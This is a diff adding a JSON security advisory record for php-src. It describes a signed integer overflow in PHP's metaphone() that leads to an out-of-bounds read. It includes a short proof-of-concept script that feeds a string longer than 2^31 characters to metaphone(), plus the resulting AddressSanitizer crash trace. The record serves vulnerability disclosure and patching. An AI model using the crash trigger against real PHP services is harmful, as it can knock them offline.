@@ -1,0 +1,75 @@
+{
+  "global": null,
+  "id": "GHSA-96wq-48vp-hh57",
+  "repo": {
+    "cve_id": "CVE-2026-7568",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": null,
+        "vector_string": null
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-125",
+      "CWE-190"
+    ],
+    "description": "**Researcher: Aleksey Solovev (Positive Technologies)**\r\n\r\nThe PHP standard library provides the function `metaphone()` (php-src/ext/standard/metaphone.c). This function is used for searching and matching words based on their phonetic sound.\r\n\r\nThis function declares the variable `signed int w_idx`, keeping track of the current position into the string passed to `metaphone()`.\r\n\r\nhttps://github.com/php/php-src/blob/9498bc3ee131616344370f59d4f1a6bb46375750/ext/standard/metaphone.c#L171\r\n\r\nThe maximum value the `signed int` type can hold is (usually) `2_147_483_647`. In C, exceeding this value for signed types is undefined behavior. Frequently, the value will wrap around and result in the value `-2_147_483_648`, but this behavior is not guaranteed.\r\n\r\nIf the string passed to `metaphone()` has a length of `>2_147_483_647`, a signed integer overflow can occur, resulting in undefined behavior. Accessing the current word after an overflow can result in a segmentation fault or access unrelated memory.\r\n\r\n```php\r\n<?php\r\n\r\nini_set('memory_limit', '-1');\r\n$str = str_repeat('0', 2 * (1024 ** 3) - 2) . 'AE';\r\nmetaphone($str, 1);\r\n\r\n?>\r\n```\r\n\r\n```\r\n$ ./php cli.php\r\nAddressSanitizer:DEADLYSIGNAL\r\n=================================================================\r\n==2977930==ERROR: AddressSanitizer: SEGV on unknown address 0x74748ba00018 (pc 0x6051a40f8a68 bp 0x7ffca9b12420 sp 0x7ffca9b123d0 T0)\r\n==2977930==The signal is caused by a READ memory access.\r\n    #0 0x6051a40f8a68 in metaphone /home/administrator/php/php-src/ext/standard/metaphone.c:192\r\n    #1 0x6051a40f8433 in zif_metaphone /home/administrator/php/php-src/ext/standard/metaphone.c:43\r\n    #2 0x6051a4552725 in ZEND_DO_ICALL_SPEC_RETVAL_UNUSED_HANDLER /home/administrator/php/php-src/Zend/zend_vm_execute.h:1355\r\n    #3 0x6051a46b7f4a in execute_ex /home/administrator/php/php-src/Zend/zend_vm_execute.h:116436\r\n    #4 0x6051a46cd123 in zend_execute /home/administrator/php/php-src/Zend/zend_vm_execute.h:121924\r\n    #5 0x6051a4831146 in zend_execute_script /home/administrator/php/php-src/Zend/zend.c:1981\r\n    #6 0x6051a42653ef in php_execute_script_ex /home/administrator/php/php-src/main/main.c:2645\r\n    #7 0x6051a42657ff in php_execute_script /home/administrator/php/php-src/main/main.c:2685\r\n    #8 0x6051a4836cb6 in do_cli /home/administrator/php/php-src/sapi/cli/php_cli.c:951\r\n    #9 0x6051a4839283 in main /home/administrator/php/php-src/sapi/cli/php_cli.c:1362\r\n    #10 0x74758f42a1c9 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58\r\n    #11 0x74758f42a28a in __libc_start_main_impl ../csu/libc-start.c:360\r\n    #12 0x6051a3406d04 in _start (/home/administrator/php/php-src/sapi/cli/php+0x606d04) (BuildId: 675b273c6c01d12f08faaf607fb51c198e4db43b)\r\n\r\nAddressSanitizer can not provide additional info.\r\nSUMMARY: AddressSanitizer: SEGV /home/administrator/php/php-src/ext/standard/metaphone.c:192 in metaphone\r\n==2977930==ABORTING\r\n```",
+    "ghsa_id": "GHSA-96wq-48vp-hh57",
+    "html_url": "https://github.com/php/php-src/security/advisories/GHSA-96wq-48vp-hh57",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-96wq-48vp-hh57"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-7568"
+      }
+    ],
+    "published_at": "2026-05-07T12:54:56Z",
+    "references": [],
+    "severity": "low",
+    "summary": "Signed integer overflow in metaphone()",
+    "updated_at": "2026-05-07T12:54:56Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "php",
+          "name": "ext-standard"
+        },
+        "patched_versions": "8.2.31",
+        "vulnerable_version_range": "< 8.2.31"
+      },
+      {
+        "package": {
+          "ecosystem": "php",
+          "name": "ext-standard"
+        },
+        "patched_versions": "8.3.31",
+        "vulnerable_version_range": "< 8.3.31"
+      },
+      {
+        "package": {
+          "ecosystem": "php",
+          "name": "ext-standard"
+        },
+        "patched_versions": "8.4.21",
+        "vulnerable_version_range": "< 8.4.21"
+      },
+      {
+        "package": {
+          "ecosystem": "php",
+          "name": "ext-standard"
+        },
+        "patched_versions": "8.5.6",
+        "vulnerable_version_range": "< 8.5.6"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "php/php-src"
+}
